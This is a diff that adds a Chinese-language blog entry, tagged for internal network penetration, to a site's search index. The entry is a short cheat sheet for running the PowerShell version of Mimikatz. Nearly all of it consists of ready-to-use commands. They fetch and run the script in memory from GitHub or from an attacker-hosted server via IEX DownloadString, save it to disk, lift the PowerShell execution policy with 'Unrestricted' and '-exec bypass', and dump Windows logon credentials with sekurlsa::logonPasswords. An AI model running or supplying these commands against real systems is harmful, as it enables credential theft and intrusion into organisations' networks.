@@ -43,4 +43,45 @@
         <tag>powershell</tag>
       </tags>
   </entry>
+  <entry>
+    <title>mimikatz ps1脚本使用</title>
+    <url>/mimikatz%20ps1/</url>
+    <content><![CDATA[<h3 id="Powershell版Mimikatz脚本使用"><a href="#Powershell版Mimikatz脚本使用" class="headerlink" title="Powershell版Mimikatz脚本使用"></a>Powershell版Mimikatz脚本使用</h3><p>********Invoke-Mimikatz.ps1脚本地址:*********<a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1</a></p>
+<p><strong>有网络环境下执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;脚本地址&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地环境执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://IP/&#x27;);Invoke-Mimikatz -DumpCreds&quot;   （本地开启服务下载ps1脚本）</span><br></pre></td></tr></table></figure>
+
+<p><strong>远程下载ps1脚本到本地</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">System.Net.Webclient).DownloadFile(&#x27;ps1脚本地址&#x27;;&#x27;C:\Users\Administrator\Desktop\Invoke-Mimikatz.ps1&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地导入脚本执行</strong></p>
+<p>查看脚本执行限制     Get-ExecutionPolicy</p>
+<p>设置为允许任意脚本执行     Set-ExecutionPolicy Unrestricted</p>
+<p>导入命令    Import-Module .\Invoke-Mimikatz.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地绕过权限执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;Import-Module ./Invoke-Mimikatz.ps1;Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
 </search>
